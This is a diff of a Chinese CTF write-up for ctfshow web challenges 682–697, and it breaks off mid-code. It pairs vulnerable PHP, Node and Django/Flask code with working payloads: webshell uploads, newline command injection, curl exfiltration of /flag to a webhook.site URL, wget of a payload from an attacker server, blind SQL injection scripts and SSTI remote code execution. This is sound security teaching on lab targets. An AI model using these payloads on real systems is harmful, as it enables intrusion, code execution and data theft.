+    var _0x403f00 = 0x0;
+    _0x38afb7 = _0x38afb7.replace(/[^A-Za-z0-9+/=]/g, '');
+    while (_0x403f00 &lt; _0x38afb7.length) {
+      _0x665708 = this._keyStr.indexOf(_0x38afb7.charAt(_0x403f00++));
+      _0x2fc104 = this._keyStr.indexOf(_0x38afb7.charAt(_0x403f00++));
+      _0x4ec53d = this._keyStr.indexOf(_0x38afb7.charAt(_0x403f00++));
+      _0x9d69a0 = this._keyStr.indexOf(_0x38afb7.charAt(_0x403f00++));
+      _0x2b6149 = _0x665708 &lt;&lt; 0x2 | _0x2fc104 &gt;&gt; 0x4;
+      _0x3edd27 = (_0x2fc104 &amp; 0xf) &lt;&lt; 0x4 | _0x4ec53d &gt;&gt; 0x2;
+      _0x5f1062 = (_0x4ec53d &amp; 0x3) &lt;&lt; 0x6 | _0x9d69a0;
+      _0x4e6b84 = _0x4e6b84 + String.fromCharCode(_0x2b6149);
+      if (_0x4ec53d != 0x40) {
+        _0x4e6b84 = _0x4e6b84 + String.fromCharCode(_0x3edd27);
+      }
+      if (_0x9d69a0 != 0x40) {
+        _0x4e6b84 = _0x4e6b84 + String.fromCharCode(_0x5f1062);
+      }
+    }
+    _0x4e6b84 = Base64._utf8_decode(_0x4e6b84);
+    return _0x4e6b84;
+  },
+  '_utf8_encode': function (_0x477ba6) {
+    _0x477ba6 = _0x477ba6.replace(/rn/g, 'n');
+    var _0xc59cb = '';
+    for (var _0x284f9e = 0x0; _0x284f9e &lt; _0x477ba6.length; _0x284f9e++) {
+      var _0x234f6f = _0x477ba6.charCodeAt(_0x284f9e);
+      if (_0x234f6f &lt; 0x80) {
+        _0xc59cb += String.fromCharCode(_0x234f6f);
+      } else if (_0x234f6f &gt; 0x7f &amp;&amp; _0x234f6f &lt; 0x800) {
+        _0xc59cb += String.fromCharCode(_0x234f6f &gt;&gt; 0x6 | 0xc0);
+        _0xc59cb += String.fromCharCode(_0x234f6f &amp; 0x3f | 0x80);
+      } else {
+        _0xc59cb += String.fromCharCode(_0x234f6f &gt;&gt; 0xc | 0xe0);
+        _0xc59cb += String.fromCharCode(_0x234f6f &gt;&gt; 0x6 &amp; 0x3f | 0x80);
+        _0xc59cb += String.fromCharCode(_0x234f6f &amp; 0x3f | 0x80);
+      }
+    }
+    return _0xc59cb;
+  },
+  '_utf8_decode': function (_0x1da40d) {
+    var _0x21181b = '';
+    var _0x24d5d3 = 0x0;
+    var _0x117591 = c1 = c2 = 0x0;
+    while (_0x24d5d3 &lt; _0x1da40d.length) {
+      _0x117591 = _0x1da40d.charCodeAt(_0x24d5d3);
+      if (_0x117591 &lt; 0x80) {
+        _0x21181b += String.fromCharCode(_0x117591);
+        _0x24d5d3++;
+      } else if (_0x117591 &gt; 0xbf &amp;&amp; _0x117591 &lt; 0xe0) {
+        c2 = _0x1da40d.charCodeAt(_0x24d5d3 + 0x1);
+        _0x21181b += String.fromCharCode((_0x117591 &amp; 0x1f) &lt;&lt; 0x6 | c2 &amp; 0x3f);
+        _0x24d5d3 += 0x2;
+      } else {
+        c2 = _0x1da40d.charCodeAt(_0x24d5d3 + 0x1);
+        c3 = _0x1da40d.charCodeAt(_0x24d5d3 + 0x2);
+        _0x21181b += String.fromCharCode((_0x117591 &amp; 0xf) &lt;&lt; 0xc | (c2 &amp; 0x3f) &lt;&lt; 0x6 | c3 &amp; 0x3f);
+        _0x24d5d3 += 0x3;
+      }
+    }
+    return _0x21181b;
+  }
+};
+
+//base32
+function st3(_0x7b38bf) {
+  if (!_0x7b38bf) {
+    return '';
+  }
+  let _0x23522e = 0x0;
+  let _0x23a42a = 0x0;
+  let _0x585f75;
+  let _0x102dee;
+  let _0x5ecc5a = '';
+  _0x7b38bf = Base64._utf8_encode(_0x7b38bf);
+  for (let _0x6e2692 = 0x0; _0x6e2692 &lt; _0x7b38bf.length;) {
+    _0x585f75 = _0x7b38bf.charCodeAt(_0x6e2692) &gt;= 0x0 ? _0x7b38bf.charCodeAt(_0x6e2692) : _0x7b38bf.charCodeAt(_0x6e2692) + 0x100;
+    if (_0x23522e &gt; 0x3) {
+      if (_0x6e2692 + 0x1 &lt; _0x7b38bf.length) {
+        _0x102dee = _0x7b38bf.charCodeAt(_0x6e2692 + 0x1) &gt;= 0x0 ? _0x7b38bf.charCodeAt(_0x6e2692 + 0x1) : _0x7b38bf.charCodeAt(_0x6e2692 + 0x1) + 0x100;
+      } else {
+        _0x102dee = 0x0;
+      }
+      _0x23a42a = _0x585f75 &amp; 0xff &gt;&gt; _0x23522e;
+      _0x23522e = (_0x23522e + 0x5) % 0x8;
+      _0x23a42a &lt;&lt;= _0x23522e;
+      _0x23a42a |= _0x102dee &gt;&gt; 0x8 - _0x23522e;
+      _0x6e2692++;
+    } else {
+      _0x23a42a = _0x585f75 &gt;&gt; 0x8 - (_0x23522e + 0x5) &amp; 0x1f;
+      _0x23522e = (_0x23522e + 0x5) % 0x8;
+      if (_0x23522e == 0x0) {
+        _0x6e2692++;
+      }
+    }
+    _0x5ecc5a = _0x5ecc5a + &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&quot;.charAt(_0x23a42a);
+  }
+  while (_0x5ecc5a.length % 0x8 !== 0x0) {
+    _0x5ecc5a += '=';
+  }
+  return _0x5ecc5a;
+}
+</code></pre>
+<p>最前面的eval是用来反调试的，当打开网页调试工具时会循环进行debug<br>
+主要看test函数对输入值的校验。</p>
+<p>得到最终的值</p>
+<pre><code>ctfshow{592b9d77-9dda-4e30-94a4-5e64f4499a52}
+</code></pre>
+<h2 id="web683">web683</h2>
+<p>连着几道都是<a href="https://xz.aliyun.com/t/6333">code-breaking</a>的题目</p>
+<blockquote>
+<p>PHP intval()函数绕过<br>
+科学计数法</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+
+   error_reporting(0);
+   include &quot;flag.php&quot;;
+   if(isset($_GET['秀'])){
+       if(!is_numeric($_GET['秀'])){
+          die('必须是数字');
+       }else if($_GET['秀'] &lt; 60 * 60 * 24 * 30 * 2){
+          die('你太短了');
+       }else if($_GET['秀'] &gt; 60 * 60 * 24 * 30 * 3){
+           die('你太长了');
+       }else{
+           sleep((int)$_GET['秀']);
+           echo $flag;
+       }
+       echo '&lt;hr&gt;';
+   }
+   highlight_file(__FILE__);
+</code></pre>
+<p>利用对科学计数法数字解析不一致来绕过<br>
+但只在php版本小于等于7.0.9时存在,这里服务端是5.6.40<br>
+payload</p>
+<pre><code>?秀=0.6e7
+</code></pre>
+<h2 id="web684">web684</h2>
+<blockquote>
+<p>PHP命名空间<br>
+create_function函数注入</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+$action = $_GET['action'] ?? '';
+$arg = $_GET['arg'] ?? '';
+
+if(preg_match('/^[a-z0-9_]*$/isD', $action)) {
+    show_source(__FILE__);
+} else {
+    $action('', $arg);
+}
+</code></pre>
+<p>首先利用命名空间绕过函数名的校验，php 里默认命名空间是<code> \</code>，所有原生函数和类都在这个命名空间中。</p>
+<p>再利用<a href="https://www.php.net/manual/en/function.create-function.php">create_funcion</a>,这个函数的第二个参数处存在代码注入。🤣</p>
+<pre><code>create_function('', return 1);
+</code></pre>
+<p>效果等同于下面代码</p>
+<pre><code>eval(
+function __lambda_func(){
+  return 1;
+}
+)
+</code></pre>
+<p>我们可以闭合functon，加入想执行的代码。</p>
+<p>payload</p>
+<pre><code>?action=\create_function&amp;arg=return%201;}system(%27cat%20/secret_you_never_know%27);/*
+</code></pre>
+<h2 id="web685">web685</h2>
+<blockquote>
+<p>PHP文件上传<br>
+PCRE 回溯次数限制绕过正则</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+function is_php($data){
+    return preg_match('/&lt;\?.*[(`;?&gt;].*/is', $data);
+}
+
+if(empty($_FILES)) {
+    die(show_source(__FILE__));
+}
+
+$user_dir = './data/';
+$data = file_get_contents($_FILES['file']['tmp_name']);
+if (is_php($data)) {
+    echo &quot;bad request&quot;;
+} else {
+    @mkdir($user_dir, 0755);
+    $path = $user_dir . '/' . random_int(0, 10) . '.php';
+    move_uploaded_file($_FILES['file']['tmp_name'], $path);
+
+    header(&quot;Location: $path&quot;, true, 303);
+}
+</code></pre>
+<p>可以使用<a href="https://regex101.com/">Regex Debugger</a>看正则匹配过程</p>
+<p>php 有一个回溯上限 backtrack_limit ，默认是 1000000。如果回溯上限超过 100 万那么 preg_match 返回 false,正常是返回0和1。</p>
+<p>再shell后面加100万个a</p>
+<p>payload</p>
+<pre><code>&lt;?php eval($_POST[1]);?&gt;//aaaaaa...
+</code></pre>
+<h2 id="web686">web686</h2>
+<blockquote>
+<p>PHP无参 RCE</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
+    eval($_GET['code']);
+} else {
+    show_source(__FILE__);
+}
+</code></pre>
+<p>正则要求只能为无参函数，可以嵌套。<br>
+可以查看phpinfo页面。</p>
+<pre><code>phpinfo();
+</code></pre>
+<p>payload</p>
+<pre><code>?code=eval(end(current(get_defined_vars())));&amp;a=system('cat%20/secret_you_never_know');
+</code></pre>
+<h2 id="web687">web687</h2>
+<blockquote>
+<p>命令注入绕过</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+    highlight_file(__FILE__);
+    $target = $_REQUEST[ 'ip' ];
+    $target=trim($target);
+    $substitutions = array(
+        '&amp;'  =&gt; '',
+        ';' =&gt; '',
+        '|' =&gt; '',
+        '-'  =&gt; '',
+        '$'  =&gt; '',
+        '('  =&gt; '',
+        ')'  =&gt; '',
+        '`'  =&gt; '',
+        '||' =&gt; '',
+    );
+
+    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+    $cmd = shell_exec( 'ping  -c 1 ' . $target );
+    echo  &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;
+</code></pre>
+<p>查看<a href="https://www.php.net/manual/en/function.trim.php">trim</a>函数发现只会去除头和尾的空白符。我们可以使用<code>%0a</code>的方式来执行命令。</p>
+<p>payload</p>
+<pre><code>?ip=127.0.0.1%0acat%20/flaaag
+</code></pre>
+<h2 id="web688">web688</h2>
+<blockquote>
+<p>命令注入绕过</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+
+//flag in /flag
+$url = $_GET['url'];
+$urlInfo = parse_url($url);
+if(!(&quot;http&quot; === strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;===strtolower($urlInfo[&quot;scheme&quot;]))){
+    die( &quot;scheme error!&quot;);
+ }
+$url=escapeshellarg($url);
+$url=escapeshellcmd($url);
+system(&quot;curl &quot;.$url);
+</code></pre>
+<p>在<a href="https://www.php.net/manual/zh/function.escapeshellarg.php"><code>escapeshellarg</code></a>和<a href="https://www.php.net/manual/zh/function.escapeshellcmd.php"><code>escapeshellcmd</code></a>同时使用的情况下会造成命令注入绕过。</p>
+<p>escapeshellarg函数会对所有单引号进行转义，并在字符串两边加上单引号。<br>
+escapeshellcmd会对特殊字符进行转义。<br>
+当同时使用时，escapeshellcmd会将escapeshellarg函数转义时使用的<code>\</code>进行转义，这样就导致单引号就逃逸了。</p>
+<p>使用curl自带的-F参数，使用上传文件方式带出数据</p>
+<p>需要记得闭合后面的单引号<br>
+payload</p>
+<pre><code>?url=https://webhook.site/71e198ec-e444-449d-a394-a46673608347/%27%20-F%20file=@/flag%20%27
+</code></pre>
+<h2 id="web689">web689</h2>
+<blockquote>
+<p>SSRF</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php 
+error_reporting(0);
+if(isset($_GET) &amp;&amp; !empty($_GET)){
+    $url = $_GET['file'];
+    $path = &quot;upload/&quot;.$_GET['path'];
+    
+}else{
+    show_source(__FILE__);
+    exit();
+}
+
+if(strpos($path,'..') &gt; -1){
+    die('This is a waf!');
+}
+if(strpos($url,'http://127.0.0.1/') === 0){
+    file_put_contents($path, file_get_contents($url));
+    echo &quot;console.log($path update successed!)&quot;;
+}else{
+    echo &quot;Hello.CTFshow&quot;;
+}
+</code></pre>
+<p>可以写入文件，但内容限制只能为<code>http://127.0.0.1/</code>开头的返回值<br>
+发现页面会回显<code>$path</code>值，可以用来控制写入文件内容。</p>
+<p>payload</p>
+<pre><code>?path=1.php&amp;file=http://127.0.0.1/?file=http://127.0.0.1/%26path=&lt;?php%20system(%27cat%20/flag%27);?&gt;
+</code></pre>
+<h2 id="web690">web690</h2>
+<blockquote>
+<p>命令执行绕过</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php 
+highlight_file(__FILE__);
+error_reporting(0);
+$args = $_GET['args'];
+for ( $i=0; $i&lt;count($args); $i++ ){
+    if ( !preg_match('/^\w+$/', $args[$i]) )
+        exit(&quot;sorry&quot;);
+}
+
+exec('./ ' . implode(&quot; &quot;, $args));
+</code></pre>
+<p>使用<code>%0a</code>不仅能通过正则校验，还能实现命令注入。<br>
+命令参数限制只能为[a-zA-Z0-9_]</p>
+<p><a href="https://www.metools.info/other/ipconvert162.html">将ip转为10进制</a></p>
+<pre><code>?args[0]=a%0a&amp;args[1]=wget&amp;args[2]=ip
+</code></pre>
+<p>wget下载时当没有文件名时使用默认文件名<code>index.html</code></p>
+<p>自己写一个py脚本来响应请求</p>
+<pre><code class="language-python">from http.server import HTTPServer, BaseHTTPRequestHandler
+ 
+host = ('0.0.0.0', 80)
+ 
+class Resquest(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b&quot;&lt;?php file_put_contents(\&quot;shell.php\&quot;,'&lt;?php eval($_POST[1]);?&gt;');?&gt;&quot;)
+ 
+if __name__ == '__main__':
+    server = HTTPServer(host, Resquest)
+    print(&quot;Starting server, listen at: %s:%s&quot; % host)
+    server.serve_forever()
+</code></pre>
+<p>创建了一个a目录，并把index.html下载进去了</p>
+<pre><code>args[0]=1%0a&amp;args[1]=mkdir&amp;args[2]=a%0a&amp;args[3]=cd&amp;args[4]=a%0a&amp;args[5]=wget&amp;args[6]=ip
+</code></pre>
+<p>因为<code>index.html</code>文件名含有<code>.</code>，这里无法使用php来执行。<br>
+我们创建的目录就有用了</p>
+<p>将目录a压缩至文件<code>shell</code>，这样文件名就不含<code>.</code>了，同时还保留着文件内容在里面。</p>
+<pre><code>?args[0]=1%0a&amp;args[1]=tar&amp;args[2]=cvf&amp;args[3]=shell&amp;args[4]=a
+</code></pre>
+<p>使用php执行文件</p>
+<pre><code>?args[0]=1%0a&amp;args[1]=php&amp;args[2]=shell
+</code></pre>
+<p>连接生成的shell.php</p>
+<h2 id="web691">web691</h2>
+<blockquote>
+<p>SQL注入<br>
+order by 排序盲注技巧</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+ 
+include('inc.php');
+highlight_file(__FILE__);
+error_reporting(0);
+function   filter($str){
+      $filterlist = &quot;/\(|\)|username|password|where|
+      case|when|like|regexp|into|limit|=|for|;/&quot;;
+      if(preg_match($filterlist,strtolower($str))){
+        die(&quot;illegal input!&quot;);
+      }
+      return $str;
+  }
+$username = isset($_POST['username'])?
+filter($_POST['username']):die(&quot;please input username!&quot;);
+$password = isset($_POST['password'])?
+filter($_POST['password']):die(&quot;please input password!&quot;);
+$sql = &quot;select * from admin where  username =
+ '$username' and password = '$password' &quot;;
+
+$res = $conn -&gt; query($sql);
+if($res-&gt;num_rows&gt;0){
+  $row = $res -&gt; fetch_assoc();
+  if($row['id']){
+     echo $row['username'];
+  }
+}else{
+   echo &quot;The content in the password column is the flag!&quot;;
+}
+
+?&gt;
+</code></pre>
+<p>只会回显username，再加上一堆过滤，想通过UNION回显注入不行。<br>
+这里用到order by的一种特殊排序盲注的方式。</p>
+<p>order by比较字符串时，会转换成hex从首字母开始比较，这里当我们设置字符串小于等于password时，会显示2，当大于password时，显示admin.</p>
+<p>poc</p>
+<pre><code class="language-python">import requests
+
+s=&quot;-0123456789abcdefghijklmnopqrstuvwxyz{}&quot;
+url=&quot;http://735a5330-22d4-44e4-88aa-77832c4633ba.challenge.ctf.show/&quot;
+
+flag=''
+for i in range(1,46):
+	print(i)
+	for j in s:
+		data={
+		'username':&quot;'||TRUE union select 1,2,'{0}' order by 3#&quot;.format(flag+j),
+		'password':''
+	    }
+		r=requests.post(url,data=data)
+		print(data['username'])
+		if(&quot;&lt;/code&gt;admin&quot; in r.text):
+			flag=flag+s[s.index(j)-1]
+			print(flag)
+			break
+</code></pre>
+<h2 id="web692">web692</h2>
+<blockquote>
+<p>addslashes+preg_replace函数单引号逃逸</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+
+if(!isset($_GET['option'])) die();
+$str = addslashes($_GET['option']);
+$file = file_get_contents('./config.php');
+$file = preg_replace('|\$option=\'.*\';|', &quot;\$option='$str';&quot;, $file);
+file_put_contents('./config.php', $file);
+</code></pre>
+<p>参考<a href="https://www.php.net/manual/zh/function.preg-replace.php">preg_replace使用文档</a></p>
+<p>preg_replace函数想要替换值为<code>\</code>,$replacement需要为<code>\\</code>，<br>
+当$replacement=<code>\\\</code>时，会替换为<code>\\</code>。</p>
+<p>这里因为使用了addslashes，我们传入参数<code>\'</code>，经过函数后会变为<code>\\\'</code><br>
+再根据上面preg_replace的特性，结果会替换为<code>\\'</code>，这样就会导致单引号逃逸，我们可以在config.php中注入php代码。</p>
+<p>payload</p>
+<pre><code>?option=\';system($_GET[1]);/*
+</code></pre>
+<h2 id="web693">web693</h2>
+<blockquote>
+<p>extract覆盖变量</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+    highlight_file(__FILE__);
+    error_reporting(0);
+    ini_set('open_basedir', '/var/www/html');
+    $file = 'function.php';
+    $func = isset($_GET['function'])?$_GET['function']:'filters'; 
+    call_user_func($func,$_GET);
+    include($file);
+    session_start();
+    $_SESSION['name'] = $_POST['name'];
+    if($_SESSION['name']=='admin'){
+        header('location:admin.php');
+    }
+?&gt;
+</code></pre>
+<p><code>call_user_func</code>函数的第二个参数是<code>$_GET</code>，需要找一个参数是数组的函数来利用，刚好<code>extract</code>函数就能实现，覆盖<code>$file</code>参数来利用文件包含执行php。</p>
+<p>payload</p>
+<pre><code>/?function=extract&amp;&amp;file=data://text/plain,&lt;?php%20phpinfo();?&gt;
+</code></pre>
+<h2 id="web694">web694</h2>
+<blockquote>
+<p>文件上传<br>
+IP伪造<br>
+目录穿越</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+$action=$_GET['action'];
+$file = substr($_GET['file'],0,3);
+$ip = array_shift(explode(&quot;,&quot;,$_SERVER['HTTP_X_FORWARDED_FOR']));
+$content = $_POST['content'];
+$path = __DIR__.DIRECTORY_SEPARATOR.$ip.DIRECTORY_SEPARATOR.$file;
+if($action=='ctfshow'){
+    file_put_contents($path,$content);
+}else{
+    highlight_file(__FILE__);
+}
+?&gt;
+</code></pre>
+<p><code>$file</code>参数只有三位，无法设置后缀为php的文件名。<code>$path</code>参数可以通过<code>X-FORWARDED-FOR</code>控制<br>
+设置成如下path</p>
+<pre><code>__DIR__/a.php/.
+</code></pre>
+<p>将<code>$file</code>参数设置为<code>.</code>，这样会识别为文件，否则会识别为目录。</p>
+<pre><code>POST /?action=ctfshow&amp;file=.
+X-FORWARDED-FOR:a.php
+
+content=&lt;?php phpinfo();?&gt;
+</code></pre>
+<h2 id="web695">web695</h2>
+<blockquote>
+<p>NodeJS组件漏洞</p>
+</blockquote>
+<pre><code class="language-js">router.post('/uploadfile', async (ctx, next) =&gt; {
+  const file = ctx.request.body.files.file;
+
+  if (!fs.existsSync(file.path)) {
+    return ctx.body = &quot;Error&quot;;
+  }
+
+  if(file.path.toString().search(&quot;/dev/fd&quot;) != -1){
+    file.path=&quot;/dev/null&quot;
+  }
+
+  const reader = fs.createReadStream(file.path);
+  let fileId = crypto.createHash('md5').update(file.name + Date.now() + SECRET).digest(&quot;hex&quot;);
+  let filePath = path.join(__dirname, 'upload/') + fileId
+  const upStream = fs.createWriteStream(filePath);
+  reader.pipe(upStream)
+  return ctx.body = &quot;Upload success ~, your fileId is here：&quot; + fileId;
+  
+});
+
+router.get('/downloadfile/:fileId', async (ctx, next) =&gt; {
+  let fileId = ctx.params.fileId;
+  ctx.attachment(fileId);
+  try {
+    await send(ctx, fileId, { root: __dirname + '/upload' });
+  }catch(e){
+    return ctx.body = &quot;no_such_file_~&quot;
+  }
+});
+</code></pre>
+<p>koa-body相关漏洞，详细信息查看<a href="https://github.com/koajs/koa-body/issues/75">isssues</a><br>
+修复建议是使用ctx.request.files代替ctx.request.body.files</p>
+<p>当使用使用后一种时，我们可以通过上传json格式数据来控制file参数的内容，以及file.name和file.path的内容。</p>
+<p>payload</p>
+<pre><code>POST /uploadfile
+Content-Type: application/json
+
+{&quot;files&quot;:{&quot;file&quot;:{&quot;name&quot;:&quot;&quot;,&quot;path&quot;:&quot;flag&quot;}}}
+</code></pre>
+<h2 id="web696">web696</h2>
+<blockquote>
+<p>Django框架<br>
+SSRF<br>
+SSTI</p>
+</blockquote>
+<p>views.py</p>
+<pre><code class="language-python">from django.shortcuts import render
+from django.http import JsonResponse
+from django.contrib.auth.models import User
+from django.contrib import auth
+from django.contrib.auth.decorators import login_required
+from .models import Token
+from .utils import ssrf_check
+import json
+import requests
+import base64
+
+
+def login(request):
+    if request.method == &quot;GET&quot;:
+        return render(request, &quot;templates/login.html&quot;)
+    elif request.method == &quot;POST&quot;:
+        try:
+            data = json.loads(request.body)
+        except ValueError:
+            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can't be unmarshal&quot;})
+        user = auth.authenticate(**data)
+        if user is not None:
+            auth.login(request, user)
+            return JsonResponse({&quot;code&quot;: 0})
+        else:
+            return JsonResponse({&quot;code&quot;: 1})
+
+
+def reg(request):
+    if request.method == &quot;GET&quot;:
+        return render(request, &quot;templates/reg.html&quot;)
+    elif request.method == &quot;POST&quot;:
+        try:
+            data = json.loads(request.body)
+        except ValueError:
+            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can't be unmarshal&quot;})
+
+        if len(User.objects.filter(username=data[&quot;username&quot;])) != 0:
+            return JsonResponse({&quot;code&quot;: 1})
+        User.objects.create_user(**data)
+        return JsonResponse({&quot;code&quot;: 0})
+
+
+@login_required
+def home(request):
+    if request.method == &quot;GET&quot;:
+        return render(request, &quot;templates/home.html&quot;)
+    elif request.method == &quot;POST&quot;:
+        white_list = [&quot;10.227.6.31:10000&quot;]
+        try:
+            data = json.loads(request.body)
+        except ValueError:
+            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can't be unmarshal&quot;})
+
+        if Token.objects.all().first().Token == data[&quot;token&quot;]:
+            try:
+                if ssrf_check(data[&quot;url&quot;], white_list):
+                    return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Hacker!&quot;})
+                else:
+                    res = requests.get(data[&quot;url&quot;], timeout=1)
+            except Exception:
+                return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request Error&quot;})
+            if res.status_code == 200:
+                return JsonResponse({&quot;code&quot;: 0, &quot;message&quot;: res.text})
+            else:
+                return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Something Wrong&quot;})
+        else:
+            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Token Error&quot;})
+
+
+def flask_rpc(request):
+    if request.META['REMOTE_ADDR'] != &quot;127.0.0.1&quot;:
+        return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Must 127.0.0.1&quot;})
+
+    methods = request.GET.get(&quot;methods&quot;)
+    url = request.GET.get(&quot;url&quot;)
+
+    if methods == &quot;GET&quot;:
+        return JsonResponse(
+            {&quot;code&quot;: 0, &quot;message&quot;: requests.get(url, headers={&quot;User-Agent&quot;: &quot;Django proxy =v=&quot;}, timeout=1).text})
+    elif methods == &quot;POST&quot;:
+        data = base64.b64decode(request.GET.get(&quot;data&quot;))
+        return JsonResponse({&quot;code&quot;: 0, &quot;message&quot;: requests.post(url, data=data,
+                                                                 headers={&quot;User-Agent&quot;: &quot;Django proxy =v=&quot;,
+                                                                          &quot;Content-Type&quot;: &quot;application/json&quot;}, timeout=1).text})
+    else:
+        return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;=3=&quot;})
+</code></pre>
+<p><code>home</code>函数处存在<code>requests.get(data[&quot;url&quot;], timeout=1)</code>，可以利用来访问<code>flask_rpc</code>函数，因为它限制只能<code>127.0.0.1</code>访问，利用<code>flask_rpc</code>函数构造POST包，访问web2中的<code>/caculator</code>,利用<code>render_template_string</code>的SSTI漏洞执行命令。</p>
+<p>但是访问home函数前需要登录，而且还需要token参数</p>
+<p>admin.py</p>
+<pre><code class="language-python">from django.contrib import admin
+from django.contrib.auth.models import Group, User
+from .models import Token
+
+
+# Register your models here.
+
+@admin.register(Token)
+class CourseModelAdmin(admin.ModelAdmin):
+    list_display = ('Token',)
+    list_display_links = None
+    list_editable = []
+
+    def save_model(self, request, obj, form, change):
+        return None
+
+    def change_view(self, request, object_id, **kwargs):
+        return None
+
+    def has_add_permission(self, request):
+        return None
+
+    def has_change_permission(self, request, obj=None):
+        return True
+
+    def has_delete_permission(self, request, obj=None):
+        return None
+
+
+admin.site.unregister(Group)
+admin.site.unregister(User)
+admin.site.site_title = &quot;Jsonhub&quot;
+admin.site.site_header = &quot;Jsonhub&quot;
+</code></pre>
+<p>我们注册一个有管理员权限的账号来查看token</p>
+<p>直接偷张图<br>
+<img src="https://fallingskies22.github.io/post-images/1724845228955.png" alt="" loading="lazy"></p>
+<pre><code class="language-json">{
+&quot;username&quot;:&quot;admin&quot;,
+&quot;password&quot;:&quot;admin&quot;,
+&quot;is_staff&quot;:1,
+&quot;is_superuser&quot;:1
+}
+</code></pre>
+<p>注册用户<br>
+<img src="https://fallingskies22.github.io/post-images/1724845456665.png" alt="" loading="lazy"></p>
+<p>登录<br>
+<img src="https://fallingskies22.github.io/post-images/1724845462595.png" alt="" loading="lazy"></p>
+<p>使用cookie获取token<br>
+<img src="https://fallingskies22.github.io/post-images/1724845466623.png" alt="" loading="lazy"></p>
+<p>payload</p>
+<pre><code>{&quot;url&quot;:&quot;http://127.0.0.1:8000/rpc?methods=POST&amp;url=http://127.0.0.1:5000/caculator&amp;data=xxxx&quot;,&quot;token&quot;:&quot;06eb4a4770ceec683fa2639bda341266&quot;}
+</code></pre>
+<p>web2/app.py</p>
+<pre><code class="language-python">from flask import Flask, request, render_template_string, abort
+import re
+import json
+import string, random
+
+app = Flask(__name__)
+
+
+def log():
+    if request.method == &quot;GET&quot;:
+        s = &quot;GET {}&quot;.format(request.url)
+
+    elif request.method == &quot;POST&quot;:
+        s = &quot;POST {}\n{}&quot;.format(request.url, request.data)
+    else:
+        s = &quot;Error! {}&quot;.format(request.method)
+    with open(&quot;/var/tmp/flask.log&quot;, &quot;wb&quot;) as log:
+        log.write(s.encode(&quot;utf8&quot;))
+        log.write(b&quot;\n&quot;)
+
+
+@app.before_request
+def before_request():
+    data = str(request.data)
+    log()
+    if &quot;{{&quot; in data or &quot;}}&quot; in data or &quot;{%&quot; in data or &quot;%}&quot; in data:
+        abort(401)
+
+
+@app.route('/')
+def index():
+    return &quot;flag{&quot; + ''.join(random.choices(string.ascii_letters + string.digits, k=32)) + &quot;}&quot;
+
+
+@app.route('/admin')
+def whoami():
+    return __import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()
+
+
+@app.route('/caculator', methods=[&quot;POST&quot;])
+def caculator():
+    try:
+        data = request.get_json()
+    except ValueError:
+        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can't be unmarshal&quot;})
+    num1 = str(data[&quot;num1&quot;])
+    num2 = str(data[&quot;num2&quot;])
+    symbols = data[&quot;symbols&quot;]
+    if re.search(&quot;[a-z]&quot;, num1, re.I) or re.search(&quot;[a-z]&quot;, num2, re.I) or not re.search(&quot;[+\-*/]&quot;, symbols):
+        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;?&quot;})
+
+    return render_template_string(str(num1) + symbols + str(num2) + &quot;=&quot; + &quot;?&quot;)
+
+
+if __name__ == '__main__':
+    app.run(host=&quot;0.0.0.0&quot;)
+</code></pre>
+<p>这里symbol参数没有过滤只需要含有<code>[+\-*/]&quot;</code>，可以注入ssti代码，再<code>before_request</code>函数中对传入数据data进行了过滤，不能含有<code>{{</code>,<code>}}</code>以及<code>{%</code>,<code>%}</code>，但刚好这里是通过json传入的数据，在json中可以通过unicode编码来绕过。</p>
+<pre><code class="language-json">{&quot;symbols&quot;:&quot;\u007b\u007bx.__init__.__globals__['__builtins__'].eval('__import__(\&quot;os\&quot;).popen(\&quot;cat /flag\&quot;).read()')\u007d\u007d-&quot;,&quot;num1&quot;:&quot;1&quot;,&quot;num2&quot;:&quot;2&quot;}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://fallingskies22.github.io/post-images/1724846975921.png" alt="" loading="lazy"></figure>
+<h2 id="web697">web697</h2>
+<blockquote>
+<p>PHP tricks<br>
+SQL注入</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+				$NOHO=isset($_GET['NOHO'])?$_GET['NOHO']:die('&lt;p&gt;Parameter NOHO:The Number Of Higher Organisms&lt;/p&gt;');
+				if ($NOHO&lt;7400000000)
+					die('&lt;p&gt;Infinite gloves AI:Obviously,The Number of higher organisms is too small!!&lt;p&gt;');
+				else{
+					if (@strlen($NOHO)&gt;2)
+						die('&lt;p&gt;Infinite gloves AI:The lenth of entered number is too long(&gt;2).&lt;p&gt;');
+				}
+				if (isset($_POST['password'])) {
